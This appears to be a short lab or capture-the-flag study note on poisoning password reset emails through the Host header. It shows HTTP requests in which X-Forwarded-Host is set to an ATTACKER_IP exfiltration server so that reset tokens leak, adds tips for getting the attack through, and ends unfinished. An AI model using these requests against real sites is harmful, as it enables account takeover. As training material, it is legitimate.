**Passwd reset poison via HOST header**
This attack happens when a particular password reset module of a file uses the host header to reflect the data into the HTML response body.
An example would be a password reset module that sends a reset token, here the app would use the Host header to read the value and send the reset token via email to the specified Host header in the request.

# Attack Scenario
Let's take as an example that a password reset field(before login) can be triggered via:
```
POST /reset.php HTTP/1.1
Host: 94.237.62.195:34275
Origin: http://94.237.62.195:34275
Referer: http://94.237.62.195:34275/reset.php
Username=admin%40httpattacks.htb&Submit=Login

```
Here upon submit a email is sent to the victim, the problem arises if we tamper the Host header to point to a ex-filtration server we own example:
```
POST /reset.php HTTP/1.1
Host: 94.237.62.195:34275
X-Forwarded-Host: ATTACKER_IP
```
TIPS:
1)You might need to test for several headers before finding the one that works out!
2)Remove all the Origin,Refer etc headers otherwise the request will not land!

OBS:In a real word scenario you can use these tools to ex-filtrate the request:
